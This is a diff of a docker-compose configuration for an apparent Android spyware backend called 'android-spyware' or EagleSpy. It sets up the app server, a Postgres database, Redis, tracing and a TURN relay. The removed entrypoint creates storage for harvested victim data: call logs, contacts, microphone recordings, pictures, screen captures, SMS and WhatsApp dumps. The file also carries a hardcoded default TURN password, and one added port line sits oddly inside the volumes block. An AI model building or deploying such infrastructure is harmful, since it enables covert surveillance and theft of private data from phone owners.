@@ -15,7 +15,7 @@ services:
     volumes:
       - ../:/app/android-spyware
       - //var/run/docker.sock://var/run/docker.sock
-    entrypoint: sh -c "rm -f tmp/pids/server.pid && bundle check || bundle install && mkdir -p /app/android-spyware/files/payloads /app/android-spyware/files/dumps/calllogs_dumps /app/android-spyware/files/dumps/contacts_dumps /app/android-spyware/files/dumps/microphone_recs /app/android-spyware/files/dumps/pictures /app/android-spyware/files/dumps/screen_snaps /app/android-spyware/files/dumps/sms_messages_dumps /app/android-spyware/files/dumps/whatsapp && rails db:migrate && rails s -b 0.0.0.0 -p 3000"
+      - "127.0.0.1:9000:3000"
     tty: true
     mem_limit: 2g
     memswap_limit: 2g
@@ -47,8 +47,8 @@ services:
       - "com.example.description=Jaeger tracing collector for android-spyware"
   db:
     image: costincanciu/android-spyware-db:latest
-    ports:
-      - "5432:5432"
+    expose:
+      - "5432"
     volumes:
       - db:/var/lib/postgresql/data
     environment:
@@ -66,8 +66,8 @@ services:
   redis:
     image: redis:7-alpine
     container_name: redis
-    ports:
-      - "6379:6379"
+    expose:
+      - "6379"
     volumes:
       - redis_data:/data
     command: redis-server --appendonly yes
@@ -77,9 +77,6 @@ services:
     ports:
       - "3478:3478"
       - "3478:3478/udp"
-      - "5349:5349"
-      - "5349:5349/udp"
-      - "49152-49200:49152-49200/udp"
     environment:
       TURN_USER: ${TURN_USER:-eaglespy}
       TURN_PASSWORD: ${TURN_PASSWORD:-EagleSpy2024Secure!}
